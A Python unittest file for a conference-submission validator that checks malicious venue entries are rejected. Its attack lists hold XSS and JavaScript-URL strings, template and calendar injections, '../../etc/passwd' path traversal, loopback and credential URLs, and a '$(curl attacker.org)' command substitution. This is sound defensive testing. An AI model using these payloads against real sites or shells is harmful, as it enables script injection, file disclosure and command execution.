import datetime as dt
import json
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
from venue_validation import InvalidSubmission, MARKER, append_venue, parse_submission

TODAY = dt.date(2026, 10, 9)


def payload():
    return {"schemaVersion": 1, "source": "https://conference.org/cfp", "venue": {"name": "Example S&P", "year": 2027, "description": "Security and Privacy", "link": "https://conference.org/", "deadline": ["2026-11-30 23:59"], "timezone": "Etc/GMT+12", "date": "June 2027", "place": "London, UK", "tags": ["SEC", "CONF"]}}


def body(value):
    return MARKER + "\n```json\n" + json.dumps(value) + "\n```"


class ValidationTests(unittest.TestCase):
    def parse(self, value, **kwargs):
        return parse_submission(body(value), today=TODAY, **kwargs)

    def test_valid_submission_round_trips_as_yaml_without_rewriting_existing_data(self):
        import yaml
        venue = self.parse(payload())["venue"]
        original = "# Leave this comment\n- name: Existing\n  year: 2026\n"
        result = append_venue(original, venue)
        self.assertTrue(result.startswith(original))
        self.assertEqual(yaml.safe_load(result)[1], venue)

    def test_html_template_shell_and_calendar_injections(self):
        for field, attacks in {
            "name": ['</script><script>alert(1)</script>', 'x\nEND:VEVENT', '$(curl attacker.org)', "x'; alert(1);//", '{{site.title}}'],
            "comment": ['<img src=x onerror=alert(1)>', '{% include secrets %}', '\r\nBEGIN:VEVENT', 'text\u202eevil'],
            "timezone": ['../../etc/passwd', "Etc/UTC';alert(1);//", '/etc/passwd'],
        }.items():
            for attack in attacks:
                with self.subTest(field=field, attack=attack):
                    value = payload()
                    value["venue"][field] = attack
                    with self.assertRaises(InvalidSubmission):
                        self.parse(value)

    def test_unsafe_and_encoded_urls(self):
        attacks = ['javascript:alert(1)', 'http://conference.org', 'https://user:pass@conference.org', 'https://127.0.0.1', 'https://[::1]', 'https://conference.local', 'https://conference.org:444', 'https://conference.org/%0aBEGIN:VEVENT', 'https://conference.org/%253cscript%253e', 'https://conference.org/"onmouseover="x', 'https://conference.org/\\evil', 'https://conference.org/%250d']
        for attack in attacks:
            with self.subTest(attack=attack):
                value = payload()
                value["source"] = attack
                with self.assertRaises(InvalidSubmission):
                    self.parse(value)

    def test_schema_size_duplicate_keys_and_invalid_dates(self):
        for field, values in {
            "year": [True, "2027", 2025, 2032],
            "deadline": [[], ['TBA', '2026-11-30 23:59'], ['2026-02-30 23:59'], ['2026-11-30 24:00'], ['%y-11-30 23:59'], ['2026-11-30 23:59'] * 9],
            "tags": [['SEC'], ['CONF'], ['SEC', 'CONF', 'EVIL'], ['SEC', 'CONF', 'SEC'], ['SEC', 'CONF', 'TOP4', 'CORE-A']],
            "comment": ["x" * 601],
            "dblp": ['https://conference.org/'],
        }.items():
            for bad in values:
                with self.subTest(field=field, bad=bad):
                    value = payload()
                    value['venue'][field] = bad
                    with self.assertRaises(InvalidSubmission):
                        self.parse(value)
        value = payload()
        value['venue']['workflow'] = 'run arbitrary code'
        with self.assertRaises(InvalidSubmission):
            self.parse(value)
        with self.assertRaises(InvalidSubmission):
            parse_submission(MARKER + '\n```json\n{"schemaVersion":1,"schemaVersion":2}\n```')
        with self.assertRaises(InvalidSubmission):
            parse_submission('x' * 6001)

    def test_duplicate_identity_is_case_and_punctuation_insensitive(self):
        with self.assertRaises(InvalidSubmission):
            self.parse(payload(), existing=[{'name': 'EXAMPLE-SP', 'year': 2027}])

    def test_tba_and_multiple_dates_are_supported(self):
        for deadlines in [['TBA'], ['2026-11-30 23:59', '2027-01-15 12:00']]:
            value = payload()
            value['venue']['deadline'] = deadlines
            self.assertEqual(self.parse(value)['venue']['deadline'], deadlines)


if __name__ == '__main__':
    unittest.main()
